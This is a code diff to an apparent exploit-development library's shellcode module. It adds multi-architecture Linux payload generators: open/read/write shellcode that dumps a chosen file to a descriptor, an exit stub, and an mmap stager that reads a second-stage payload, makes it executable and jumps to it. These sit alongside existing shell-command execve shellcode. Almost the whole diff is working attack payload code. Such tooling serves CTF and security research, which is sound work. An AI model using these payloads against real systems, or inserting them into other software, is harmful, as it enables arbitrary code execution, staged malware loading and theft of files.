@@ -17,6 +17,14 @@ def _align(value: int, alignment: int) -> int:
     return (value + alignment - 1) & -alignment
 
 
+def _instruction_alignment(target: Target) -> int:
+    if target.arch in {Architecture.X86, Architecture.X86_64}:
+        return 1
+    if target.arch is Architecture.THUMB:
+        return 2
+    return 4
+
+
 @dataclass(frozen=True, slots=True)
 class _ExecveStack:
     data: bytes
@@ -24,6 +32,15 @@ class _ExecveStack:
     dash_c_offset: int
     command_offset: int
     argv_offset: int
+    frame_size: int
+
+
+@dataclass(frozen=True, slots=True)
+class _OrwStack:
+    data: bytes
+    path_offset: int
+    buffer_offset: int
+    buffer_size: int
     frame_size: int
 
 
@@ -54,6 +71,25 @@ def _execve_stack(target: Target, command: str | bytes) -> _ExecveStack:
     if frame_size > _MAX_STACK_IMAGE:
         raise ValueError(f"command stack image is {frame_size} bytes; maximum is {_MAX_STACK_IMAGE}")
     return _ExecveStack(bytes(image), path_offset, dash_c_offset, command_offset, argv_offset, frame_size)
+
+
+def _orw_stack(target: Target, path: str | bytes, max_bytes: int) -> _OrwStack:
+    encoded = path.encode() if isinstance(path, str) else bytes(path)
+    if not encoded:
+        raise ValueError("path cannot be empty")
+    if b"\0" in encoded:
+        raise ValueError("path cannot contain a NUL byte")
+    if max_bytes <= 0:
+        raise ValueError("max_bytes must be positive")
+
+    image = bytearray()
+    path_offset = _append_cstring(image, encoded, target.word_size)
+    buffer_offset = _align(len(image), target.convention.stack_alignment)
+    frame_size = _align(buffer_offset + max_bytes, target.convention.stack_alignment)
+    if frame_size > _MAX_STACK_IMAGE:
+        raise ValueError(f"ORW stack image is {frame_size} bytes; maximum is {_MAX_STACK_IMAGE}")
+    image.extend(b"\0" * (buffer_offset - len(image)))
+    return _OrwStack(bytes(image), path_offset, buffer_offset, max_bytes, frame_size)
 
 
 def _word_chunks(target: Target, data: bytes) -> list[tuple[int, int]]:
@@ -253,6 +289,709 @@ def _riscv_execve(target: Target, stack: _ExecveStack) -> list[str]:
     return lines
 
 
+def _x86_orw(target: Target, stack: _OrwStack, output_fd: int) -> list[str]:
+    is_64 = target.arch is Architecture.X86_64
+    sp = "rsp" if is_64 else "esp"
+    accumulator = "rax" if is_64 else "eax"
+    word = "qword" if is_64 else "dword"
+    lines = [f"sub {sp}, {stack.frame_size}"]
+    for offset, value in _word_chunks(target, stack.data):
+        lines.extend((f"mov {accumulator}, 0x{value:x}", f"mov {word} ptr [{sp} + {offset}], {accumulator}"))
+    if is_64:
+        lines.extend(
+            (
+                f"lea rdi, [rsp + {stack.path_offset}]",
+                "xor esi, esi",
+                "xor edx, edx",
+                "mov eax, 2",
+                "syscall",
+                "test rax, rax",
+                "js .Lorw_fail",
+                "mov rdi, rax",
+                f"lea rsi, [rsp + {stack.buffer_offset}]",
+                f"mov edx, {stack.buffer_size}",
+                "xor eax, eax",
+                "syscall",
+                "test rax, rax",
+                "jle .Lorw_done",
+                "mov rdx, rax",
+                f"mov edi, {output_fd}",
+                f"lea rsi, [rsp + {stack.buffer_offset}]",
+                "mov eax, 1",
+                "syscall",
+                ".Lorw_done:",
+                "xor edi, edi",
+                "mov eax, 60",
+                "syscall",
+                ".Lorw_fail:",
+                "mov edi, 126",
+                "mov eax, 60",
+                "syscall",
+            )
+        )
+    else:
+        lines.extend(
+            (
+                f"lea ebx, [esp + {stack.path_offset}]",
+                "xor ecx, ecx",
+                "xor edx, edx",
+                "mov eax, 5",
+                "int 0x80",
+                "test eax, eax",
+                "js .Lorw_fail",
+                "mov ebx, eax",
+                f"lea ecx, [esp + {stack.buffer_offset}]",
+                f"mov edx, {stack.buffer_size}",
+                "mov eax, 3",
+                "int 0x80",
+                "test eax, eax",
+                "jle .Lorw_done",
+                "mov edx, eax",
+                f"mov ebx, {output_fd}",
+                f"lea ecx, [esp + {stack.buffer_offset}]",
+                "mov eax, 4",
+                "int 0x80",
+                ".Lorw_done:",
+                "xor ebx, ebx",
+                "mov eax, 1",
+                "int 0x80",
+                ".Lorw_fail:",
+                "mov ebx, 126",
+                "mov eax, 1",
+                "int 0x80",
+            )
+        )
+    return lines
+
+
+def _arm_orw(target: Target, stack: _OrwStack, output_fd: int) -> list[str]:
+    suffix = ".w" if target.arch is Architecture.THUMB else ""
+    lines = [f"sub{suffix} sp, sp, #{stack.frame_size}"]
+    for offset, value in _word_chunks(target, stack.data):
+        lines.extend(
+            (
+                f"movw r12, #{value & 0xFFFF}",
+                f"movt r12, #{value >> 16}",
+                f"str{suffix} r12, [sp, #{offset}]",
+            )
+        )
+    lines.extend(
+        (
+            f"add{suffix} r0, sp, #{stack.path_offset}",
+            "eor r1, r1, r1",
+            "eor r2, r2, r2",
+            "movw r7, #5",
+            "svc #0",
+            "cmp r0, #0",
+            "blt .Lorw_fail",
+            "mov r4, r0",
+            "mov r0, r4",
+            f"add{suffix} r1, sp, #{stack.buffer_offset}",
+            f"movw r2, #{stack.buffer_size}",
+            "movw r7, #3",
+            "svc #0",
+            "cmp r0, #0",
+            "ble .Lorw_done",
+            "mov r2, r0",
+            f"movw r0, #{output_fd}",
+            f"add{suffix} r1, sp, #{stack.buffer_offset}",
+            "movw r7, #4",
+            "svc #0",
+            ".Lorw_done:",
+            "eor r0, r0, r0",
+            "movw r7, #1",
+            "svc #0",
+            ".Lorw_fail:",
+            "movw r0, #126",
+            "movw r7, #1",
+            "svc #0",
+        )
+    )
+    return lines
+
+
+def _aarch64_orw(target: Target, stack: _OrwStack, output_fd: int) -> list[str]:
+    lines = [f"sub sp, sp, #{stack.frame_size}"]
+    for offset, value in _word_chunks(target, stack.data):
+        lines.extend(_aarch64_load("x9", value))
+        lines.append(f"str x9, [sp, #{offset}]")
+    lines.extend(
+        (
+            "movn x0, #99",
+            f"add x1, sp, #{stack.path_offset}",
+            "mov x2, xzr",
+            "mov x3, xzr",
+            "mov x8, #56",
+            "svc #0",
+            "cmp x0, #0",
+            "b.lt .Lorw_fail",
+            "mov x19, x0",
+            "mov x0, x19",
+            f"add x1, sp, #{stack.buffer_offset}",
+            f"mov x2, #{stack.buffer_size}",
+            "mov x8, #63",
+            "svc #0",
+            "cmp x0, #0",
+            "b.le .Lorw_done",
+            "mov x2, x0",
+            f"mov x0, #{output_fd}",
+            f"add x1, sp, #{stack.buffer_offset}",
+            "mov x8, #64",
+            "svc #0",
+            ".Lorw_done:",
+            "mov x0, xzr",
+            "mov x8, #93",
+            "svc #0",
+            ".Lorw_fail:",
+            "mov x0, #126",
+            "mov x8, #93",
+            "svc #0",
+        )
+    )
+    return lines
+
+
+def _mips_orw(target: Target, stack: _OrwStack, output_fd: int) -> list[str]:
+    is_64 = target.arch is Architecture.MIPS64
+    add = "daddiu" if is_64 else "addiu"
+    load = "dli" if is_64 else "li"
+    store = "sd" if is_64 else "sw"
+    number_base = 5000 if is_64 else 4000
+    read_number = number_base if is_64 else number_base + 3
+    write_number = number_base + 1 if is_64 else number_base + 4
+    open_number = number_base + 2 if is_64 else number_base + 5
+    exit_number = number_base + 58 if is_64 else number_base + 1
+    lines = [f"{add} $sp, $sp, -{stack.frame_size}"]
+    for offset, value in _word_chunks(target, stack.data):
+        lines.extend((f"{load} $t0, 0x{value:x}", f"{store} $t0, {offset}($sp)"))
+    lines.extend(
+        (
+            f"{add} $a0, $sp, {stack.path_offset}",
+            f"{add} $a1, $zero, 0",
+            f"{add} $a2, $zero, 0",
+            f"{load} $v0, {open_number}",
+            "syscall",
+            "bnez $a3, .Lorw_fail",
+            "nop",
+            "move $s0, $v0",
+            "move $a0, $s0",
+            f"{add} $a1, $sp, {stack.buffer_offset}",
+            f"{load} $a2, {stack.buffer_size}",
+            f"{load} $v0, {read_number}",
+            "syscall",
+            "bnez $a3, .Lorw_done",
+            "nop",
+            "blez $v0, .Lorw_done",
+            "nop",
+            "move $a2, $v0",
+            f"{load} $a0, {output_fd}",
+            f"{add} $a1, $sp, {stack.buffer_offset}",
+            f"{load} $v0, {write_number}",
+            "syscall",
+            "nop",
+            ".Lorw_done:",
+            f"{add} $a0, $zero, 0",
+            f"{load} $v0, {exit_number}",
+            "syscall",
+            "nop",
+            ".Lorw_fail:",
+            f"{add} $a0, $zero, 126",
+            f"{load} $v0, {exit_number}",
+            "syscall",
+            "nop",
+        )
+    )
+    return lines
+
+
+def _riscv_orw(target: Target, stack: _OrwStack, output_fd: int) -> list[str]:
+    lines = [f"addi sp, sp, -{stack.frame_size}"]
+    store = "sd" if target.arch is Architecture.RISCV64 else "sw"
+    for offset, value in _word_chunks(target, stack.data):
+        lines.extend((f"li t0, 0x{value:x}", f"{store} t0, {offset}(sp)"))
+    lines.extend(
+        (
+            "li a0, -100",
+            f"addi a1, sp, {stack.path_offset}",
+            "li a2, 0",
+            "li a3, 0",
+            "li a7, 56",
+            "ecall",
+            "blt a0, zero, .Lorw_fail",
+            "mv s0, a0",
+            "mv a0, s0",
+            f"addi a1, sp, {stack.buffer_offset}",
+            f"li a2, {stack.buffer_size}",
+            "li a7, 63",
+            "ecall",
+            "bge zero, a0, .Lorw_done",
+            "mv a2, a0",
+            f"li a0, {output_fd}",
+            f"addi a1, sp, {stack.buffer_offset}",
+            "li a7, 64",
+            "ecall",
+            ".Lorw_done:",
+            "li a0, 0",
+            "li a7, 93",
+            "ecall",
+            ".Lorw_fail:",
+            "li a0, 126",
+            "li a7, 93",
+            "ecall",
+        )
+    )
+    return lines
+
+
+def exit_source(status: int, target: Target) -> str:
+    """Lower a Linux ``exit(status)`` shellcode stub."""
+
+    if not 0 <= status <= 255:
+        raise ValueError("exit status must be in the range 0..255")
+    lines = _header(target)
+    if target.arch is Architecture.X86:
+        lines.extend((f"mov ebx, {status}", "mov eax, 1", "int 0x80"))
+    elif target.arch is Architecture.X86_64:
+        lines.extend((f"mov edi, {status}", "mov eax, 60", "syscall"))
+    elif target.arch in {Architecture.ARM, Architecture.THUMB}:
+        lines.extend((f"movw r0, #{status}", "movw r7, #1", "svc #0"))
+    elif target.arch is Architecture.ARM64:
+        lines.extend((f"mov x0, #{status}", "mov x8, #93", "svc #0"))
+    elif target.arch in {Architecture.MIPS32, Architecture.MIPS64}:
+        is_64 = target.arch is Architecture.MIPS64
+        add = "daddiu" if is_64 else "addiu"
+        load = "dli" if is_64 else "li"
+        number = 5058 if is_64 else 4001
+        lines.extend((f"{add} $a0, $zero, {status}", f"{load} $v0, {number}", "syscall", "nop"))
+    elif target.arch in {Architecture.RISCV32, Architecture.RISCV64}:
+        lines.extend((f"li a0, {status}", "li a7, 93", "ecall"))
+    else:
+        raise UnsupportedTargetError(f"exit shellcode is not implemented for {target.name}")
+    return "\n".join(lines) + "\n"
+
+
+def exit_shellcode(status: int, target: Target, *, assembler: LLVMAssembler | None = None) -> Payload:
+    """Build a minimal target-native Linux exit payload."""
+
+    source = exit_source(status, target)
+    data = (assembler or LLVMAssembler()).assemble(source, target)
+    return Payload(
+        data=data,
+        target=target,
+        kind=PayloadKind.SHELLCODE,
+        description=f"exit({status}) shellcode",
+        memory=(
+            MemoryRequirement(
+                len(data),
+                Permission.READ | Permission.EXECUTE,
+                "shellcode bytes",
+                alignment=_instruction_alignment(target),
+            ),
+        ),
+        metadata={
+            "operation": "exit",
+            "status": status,
+            "position_independent": True,
+            "assembly": source,
+        },
+    )
+
+
+def _arm_load(register: str, value: int) -> list[str]:
+    value &= 0xFFFFFFFF
+    return [f"movw {register}, #{value & 0xFFFF}", f"movt {register}, #{value >> 16}"]
+
+
+def _x86_stager(target: Target, size: int, map_size: int, input_fd: int) -> list[str]:
+    if target.arch is Architecture.X86_64:
+        return [
+            "xor edi, edi",
+            f"mov esi, {map_size}",
+            "mov edx, 3",
+            "mov r10d, 0x22",
+            "mov r8, -1",
+            "xor r9d, r9d",
+            "mov eax, 9",
+            "syscall",
+            "test rax, rax",
+            "js .Lstage_fail",
+            "mov r12, rax",
+            "mov r13, rax",
+            f"mov r14, {size}",
+            ".Lstage_read:",
+            f"mov edi, {input_fd}",
+            "mov rsi, r13",
+            "mov rdx, r14",
+            "xor eax, eax",
+            "syscall",
+            "test rax, rax",
+            "jle .Lstage_fail",
+            "add r13, rax",
+            "sub r14, rax",
+            "jne .Lstage_read",
+            "mov rdi, r12",
+            f"mov esi, {map_size}",
+            "mov edx, 5",
+            "mov eax, 10",
+            "syscall",
+            "test rax, rax",
+            "js .Lstage_fail",
+            "jmp r12",
+            ".Lstage_fail:",
+            "mov edi, 125",
+            "mov eax, 60",
+            "syscall",
+        ]
+    return [
+        "xor ebx, ebx",
+        f"mov ecx, {map_size}",
+        "mov edx, 3",
+        "mov esi, 0x22",
+        "mov edi, -1",
+        "xor ebp, ebp",
+        "mov eax, 192",
+        "int 0x80",
+        "test eax, eax",
+        "js .Lstage_fail",
+        "mov esi, eax",
+        "mov edi, eax",
+        f"mov ebp, {size}",
+        ".Lstage_read:",
+        f"mov ebx, {input_fd}",
+        "mov ecx, edi",
+        "mov edx, ebp",
+        "mov eax, 3",
+        "int 0x80",
+        "test eax, eax",
+        "jle .Lstage_fail",
+        "add edi, eax",
+        "sub ebp, eax",
+        "jne .Lstage_read",
+        "mov ebx, esi",
+        f"mov ecx, {map_size}",
+        "mov edx, 5",
+        "mov eax, 125",
+        "int 0x80",
+        "test eax, eax",
+        "js .Lstage_fail",
+        "jmp esi",
+        ".Lstage_fail:",
+        "mov ebx, 125",
+        "mov eax, 1",
+        "int 0x80",
+    ]
+
+
+def _arm_stager(target: Target, size: int, map_size: int, input_fd: int) -> list[str]:
+    suffix = ".w" if target.arch is Architecture.THUMB else ""
+    lines = ["eor r0, r0, r0"]
+    lines.extend(_arm_load("r1", map_size))
+    lines.extend(("movw r2, #3", "movw r3, #0x22"))
+    lines.extend(_arm_load("r4", -1))
+    lines.extend(("eor r5, r5, r5", "movw r7, #192", "svc #0", "cmp r0, #0", "blt .Lstage_fail"))
+    lines.extend(("mov r4, r0", "mov r5, r0"))
+    lines.extend(_arm_load("r6", size))
+    lines.extend(_arm_load("r8", size))
+    lines.extend(
+        (
+            ".Lstage_read:",
+            f"movw r0, #{input_fd}",
+            "mov r1, r5",
+            "mov r2, r6",
+            "movw r7, #3",
+            "svc #0",
+            "cmp r0, #0",
+            "ble .Lstage_fail",
+            f"add{suffix} r5, r5, r0",
+            f"sub{suffix} r6, r6, r0",
+            "cmp r6, #0",
+            "bne .Lstage_read",
+            "mov r0, r4",
+        )
+    )
+    lines.extend(_arm_load("r1", map_size))
+    lines.extend(("movw r2, #5", "movw r7, #125", "svc #0", "cmp r0, #0", "blt .Lstage_fail"))
+    lines.extend(
+        (
+            "mov r0, r4",
+            f"add{suffix} r1, r4, r8",
+            "eor r2, r2, r2",
+            "movw r7, #2",
+            "movt r7, #15",
+            "svc #0",
+        )
+    )
+    if target.arch is Architecture.THUMB:
+        lines.append("orr.w r4, r4, #1")
+    lines.extend(
+        (
+            "bx r4",
+            ".Lstage_fail:",
+            "movw r0, #125",
+            "movw r7, #1",
+            "svc #0",
+        )
+    )
+    return lines
+
+
+def _aarch64_stager(size: int, map_size: int, input_fd: int) -> list[str]:
+    lines = ["mov x0, xzr"]
+    lines.extend(_aarch64_load("x1", map_size))
+    lines.extend(("mov x2, #3", "mov x3, #0x22", "movn x4, #0", "mov x5, xzr", "mov x8, #222", "svc #0"))
+    lines.extend(("cmp x0, #0", "b.lt .Lstage_fail", "mov x19, x0", "mov x20, x0"))
+    lines.extend(_aarch64_load("x21", size))
+    lines.extend(_aarch64_load("x22", size))
+    lines.extend(
+        (
+            ".Lstage_read:",
+            f"mov x0, #{input_fd}",
+            "mov x1, x20",
+            "mov x2, x21",
+            "mov x8, #63",
+            "svc #0",
+            "cmp x0, #0",
+            "b.le .Lstage_fail",
+            "add x20, x20, x0",
+            "sub x21, x21, x0",
+            "cbnz x21, .Lstage_read",
+            "mov x0, x19",
+        )
+    )
+    lines.extend(_aarch64_load("x1", map_size))
+    lines.extend(
+        (
+            "mov x2, #5",
+            "mov x8, #226",
+            "svc #0",
+            "cmp x0, #0",
+            "b.lt .Lstage_fail",
+            "mrs x9, ctr_el0",
+            "ubfx x10, x9, #16, #4",
+            "mov x11, #4",
+            "lsl x10, x11, x10",
+            "sub x11, x10, #1",
+            "bic x12, x19, x11",
+            "add x13, x19, x22",
+            ".Lstage_dc:",
+            "dc cvau, x12",
+            "add x12, x12, x10",
+            "cmp x12, x13",
+            "b.lo .Lstage_dc",
+            "dsb ish",
+            "and x10, x9, #0xf",
+            "mov x11, #4",
+            "lsl x10, x11, x10",
+            "sub x11, x10, #1",
+            "bic x12, x19, x11",
+            ".Lstage_ic:",
+            "ic ivau, x12",
+            "add x12, x12, x10",
+            "cmp x12, x13",
+            "b.lo .Lstage_ic",
+            "dsb ish",
+            "isb",
+            "br x19",
+            ".Lstage_fail:",
+            "mov x0, #125",
+            "mov x8, #93",
+            "svc #0",
+        )
+    )
+    return lines
+
+
+def _mips_stager(target: Target, size: int, map_size: int, input_fd: int) -> list[str]:
+    is_64 = target.arch is Architecture.MIPS64
+    add_immediate = "daddiu" if is_64 else "addiu"
+    add_register = "daddu" if is_64 else "addu"
+    subtract = "dsubu" if is_64 else "subu"
+    load = "dli" if is_64 else "li"
+    store = "sd" if is_64 else "sw"
+    mmap_number = 5009 if is_64 else 4210
+    read_number = 5000 if is_64 else 4003
+    mprotect_number = 5010 if is_64 else 4125
+    cacheflush_number = 5197 if is_64 else 4147
+    exit_number = 5058 if is_64 else 4001
+    flags = 0x802
+    lines: list[str] = []
+    if not is_64:
+        lines.extend(("addiu $sp, $sp, -32", "li $t0, -1", "sw $t0, 16($sp)", "sw $zero, 20($sp)"))
+    lines.extend(
+        (
+            f"{add_immediate} $a0, $zero, 0",
+            f"{load} $a1, {map_size}",
+            f"{load} $a2, 3",
+            f"{load} $a3, {flags}",
+        )
+    )
+    if is_64:
+        lines.extend((f"{load} $a4, -1", f"{add_immediate} $a5, $zero, 0"))
+    lines.extend((f"{load} $v0, {mmap_number}", "syscall", "bnez $a3, .Lstage_fail", "nop"))
+    lines.extend(("move $s0, $v0", "move $s1, $v0", f"{load} $s2, {size}", ".Lstage_read:"))
+    lines.extend(
+        (
+            f"{load} $a0, {input_fd}",
+            "move $a1, $s1",
+            "move $a2, $s2",
+            f"{load} $v0, {read_number}",
+            "syscall",
+            "bnez $a3, .Lstage_fail",
+            "nop",
+            "blez $v0, .Lstage_fail",
+            "nop",
+            f"{add_register} $s1, $s1, $v0",
+            f"{subtract} $s2, $s2, $v0",
+            "bnez $s2, .Lstage_read",
+            "nop",
+            "move $a0, $s0",
+            f"{load} $a1, {map_size}",
+            f"{load} $a2, 5",
+            f"{load} $v0, {mprotect_number}",
+            "syscall",
+            "bnez $a3, .Lstage_fail",
+            "nop",
+            "move $a0, $s0",
+            f"{load} $a1, {size}",
+            f"{load} $a2, 3",
+            f"{load} $v0, {cacheflush_number}",
+            "syscall",
+            "bnez $a3, .Lstage_fail",
+            "nop",
+            "jr $s0",
+            "nop",
+            ".Lstage_fail:",
+            f"{load} $a0, 125",
+            f"{load} $v0, {exit_number}",
+            "syscall",
+            "nop",
+        )
+    )
+    return lines
+
+
+def _riscv_stager(target: Target, size: int, map_size: int, input_fd: int) -> list[str]:
+    return [
+        "li a0, 0",
+        f"li a1, {map_size}",
+        "li a2, 3",
+        "li a3, 0x22",
+        "li a4, -1",
+        "li a5, 0",
+        "li a7, 222",
+        "ecall",
+        "blt a0, zero, .Lstage_fail",
+        "mv s0, a0",
+        "mv s1, a0",
+        f"li s2, {size}",
+        ".Lstage_read:",
+        f"li a0, {input_fd}",
+        "mv a1, s1",
+        "mv a2, s2",
+        "li a7, 63",
+        "ecall",
+        "bge zero, a0, .Lstage_fail",
+        "add s1, s1, a0",
+        "sub s2, s2, a0",
+        "bnez s2, .Lstage_read",
+        "mv a0, s0",
+        f"li a1, {map_size}",
+        "li a2, 5",
+        "li a7, 226",
+        "ecall",
+        "blt a0, zero, .Lstage_fail",
+        "fence.i",
+        "jr s0",
+        ".Lstage_fail:",
+        "li a0, 125",
+        "li a7, 93",
+        "ecall",
+    ]
+
+
+def mmap_stager_source(
+    size: int,
+    target: Target,
+    *,
+    input_fd: int = 0,
+    page_size: int = 0x1000,
+) -> tuple[str, int]:
+    """Lower an exact-read, RW-to-RX ``mmap`` stager.
+
+    The stage is read completely, the mapping is changed from ``RW`` to
+    ``RX``, and non-coherent instruction caches are finalized before control
+    transfers.  A page size is an explicit runtime input because it is not
+    fixed by architecture alone.
+    """
+
+    if size <= 0 or size > 0x7FFFFFFF:
+        raise ValueError("stage size must be in the range 1..0x7fffffff")
+    if not 0 <= input_fd <= 0xFFFF:
+        raise ValueError("input_fd must be in the range 0..65535")
+    if page_size <= 0 or page_size & (page_size - 1):
+        raise ValueError("page_size must be a positive power of two")
+    map_size = _align(size, page_size)
+    lines = _header(target)
+    if target.arch in {Architecture.X86, Architecture.X86_64}:
+        lines.extend(_x86_stager(target, size, map_size, input_fd))
+    elif target.arch in {Architecture.ARM, Architecture.THUMB}:
+        lines.extend(_arm_stager(target, size, map_size, input_fd))
+    elif target.arch is Architecture.ARM64:
+        lines.extend(_aarch64_stager(size, map_size, input_fd))
+    elif target.arch in {Architecture.MIPS32, Architecture.MIPS64}:
+        lines.extend(_mips_stager(target, size, map_size, input_fd))
+    elif target.arch in {Architecture.RISCV32, Architecture.RISCV64}:
+        lines.extend(_riscv_stager(target, size, map_size, input_fd))
+    else:
+        raise UnsupportedTargetError(f"mmap stager is not implemented for {target.name}")
+    return "\n".join(lines) + "\n", map_size
+
+
+def mmap_stager(
+    size: int,
+    target: Target,
+    *,
+    input_fd: int = 0,
+    page_size: int = 0x1000,
+    assembler: LLVMAssembler | None = None,
+) -> Payload:
+    """Build a loader that allocates, reads, finalizes, and runs a second stage."""
+
+    source, map_size = mmap_stager_source(size, target, input_fd=input_fd, page_size=page_size)
+    data = (assembler or LLVMAssembler()).assemble(source, target)
+    return Payload(
+        data=data,
+        target=target,
+        kind=PayloadKind.SHELLCODE,
+        description="mmap/read/mprotect/cache-finalize/jump stager",
+        memory=(
+            MemoryRequirement(
+                len(data),
+                Permission.READ | Permission.EXECUTE,
+                "first-stage shellcode bytes",
+                alignment=_instruction_alignment(target),
+            ),
+            MemoryRequirement(
+                map_size,
+                Permission.READ | Permission.EXECUTE,
+                "second-stage mapping (writable only while loading)",
+                alignment=page_size,
+            ),
+        ),
+        metadata={
+            "operation": "allocate-read-execute",
+            "stage_size": size,
+            "mapping_size": map_size,
+            "input_fd": input_fd,
+            "mapping_transition": "rw-to-rx",
+            "exact_read_loop": True,
+            "instruction_cache_finalized": target.arch not in {Architecture.X86, Architecture.X86_64},
+            "position_independent": True,
+            "assembly": source,
+        },
+    )
+
+
 def command_source(command: str | bytes, target: Target) -> tuple[str, int]:
     """Lower ``execve('/bin/sh', ['sh', '-c', command], NULL)`` to assembly."""
 
@@ -284,12 +1023,6 @@ def command_shellcode(
     source, stack_size = command_source(command, target)
     data = (assembler or LLVMAssembler()).assemble(source, target)
     needs_cache_sync = target.arch not in {Architecture.X86, Architecture.X86_64}
-    if target.arch in {Architecture.X86, Architecture.X86_64}:
-        instruction_alignment = 1
-    elif target.arch is Architecture.THUMB:
-        instruction_alignment = 2
-    else:
-        instruction_alignment = 4
     return Payload(
         data=data,
         target=target,
@@ -300,7 +1033,7 @@ def command_shellcode(
                 len(data),
                 Permission.READ | Permission.EXECUTE,
                 "shellcode bytes",
-                alignment=instruction_alignment,
+                alignment=_instruction_alignment(target),
             ),
             MemoryRequirement(
                 stack_size,
@@ -319,4 +1052,84 @@ def command_shellcode(
     )
 
 
-__all__ = ["command_shellcode", "command_source"]
+def orw_source(
+    path: str | bytes,
+    target: Target,
+    *,
+    max_bytes: int = 0x400,
+    output_fd: int = 1,
+) -> tuple[str, int]:
+    """Lower one ``open/read/write`` pass to architecture-specific assembly."""
+
+    if not 0 <= output_fd <= 0xFFFF:
+        raise ValueError("output_fd must be in the range 0..65535")
+    stack = _orw_stack(target, path, max_bytes)
+    lines = _header(target)
+    if target.arch in {Architecture.X86, Architecture.X86_64}:
+        lines.extend(_x86_orw(target, stack, output_fd))
+    elif target.arch in {Architecture.ARM, Architecture.THUMB}:
+        lines.extend(_arm_orw(target, stack, output_fd))
+    elif target.arch is Architecture.ARM64:
+        lines.extend(_aarch64_orw(target, stack, output_fd))
+    elif target.arch in {Architecture.MIPS32, Architecture.MIPS64}:
+        lines.extend(_mips_orw(target, stack, output_fd))
+    elif target.arch in {Architecture.RISCV32, Architecture.RISCV64}:
+        lines.extend(_riscv_orw(target, stack, output_fd))
+    else:
+        raise UnsupportedTargetError(f"ORW shellcode is not implemented for {target.name}")
+    return "\n".join(lines) + "\n", stack.frame_size
+
+
+def orw_shellcode(
+    path: str | bytes,
+    target: Target,
+    *,
+    max_bytes: int = 0x400,
+    output_fd: int = 1,
+    assembler: LLVMAssembler | None = None,
+) -> Payload:
+    """Build position-independent shellcode that copies one file to an fd."""
+
+    source, stack_size = orw_source(path, target, max_bytes=max_bytes, output_fd=output_fd)
+    data = (assembler or LLVMAssembler()).assemble(source, target)
+    return Payload(
+        data=data,
+        target=target,
+        kind=PayloadKind.SHELLCODE,
+        description="open/read/write file shellcode",
+        memory=(
+            MemoryRequirement(
+                len(data),
+                Permission.READ | Permission.EXECUTE,
+                "shellcode bytes",
+                alignment=_instruction_alignment(target),
+            ),
+            MemoryRequirement(
+                stack_size,
+                Permission.READ | Permission.WRITE,
+                "ORW path and read buffer",
+                alignment=target.convention.stack_alignment,
+            ),
+        ),
+        metadata={
+            "operation": "open-read-write",
+            "max_bytes": max_bytes,
+            "output_fd": output_fd,
+            "position_independent": True,
+            "requires_instruction_cache_sync_after_runtime_write": target.arch
+            not in {Architecture.X86, Architecture.X86_64},
+            "assembly": source,
+        },
+    )
+
+
+__all__ = [
+    "command_shellcode",
+    "command_source",
+    "exit_shellcode",
+    "exit_source",
+    "mmap_stager",
+    "mmap_stager_source",
+    "orw_shellcode",
+    "orw_source",
+]
